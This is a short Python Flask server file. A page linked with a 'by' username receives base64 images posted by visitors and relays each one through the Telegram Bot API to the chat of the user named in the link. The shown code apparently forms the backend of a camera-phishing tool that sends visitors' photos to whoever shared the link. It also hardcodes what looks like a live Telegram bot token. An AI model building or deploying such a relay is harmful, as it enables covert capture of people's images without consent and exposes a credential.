from flask import Flask, request, render_template
import requests, base64, io
from user_data import user_chat_ids

app = Flask(__name__)
BOT_TOKEN = '7461480911:AAF7CcvwU03m5npGWYWXRZ1P7fHJOv1VGJk'  # Replace this
@app.route('/')
def index():
    username = request.args.get("by", "Anonymous")
    return render_template('index.html', by=username)

@app.route('/api/send-photo', methods=['POST'])
def receive_photo():
    data = request.json
    image_data = data['image'].split(',')[1]
    username = data['username']
    chat_id = user_chat_ids.get(username)

    if not chat_id:
        return 'User not found', 404

    img_bytes = base64.b64decode(image_data)
    files = {'photo': ('photo.jpg', io.BytesIO(img_bytes))}
    payload = {'chat_id': chat_id}

    requests.post(
        f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto',
        files=files,
        data=payload
    )

    return 'OK', 200

if __name__ == '__main__':
    app.run(debug=True)
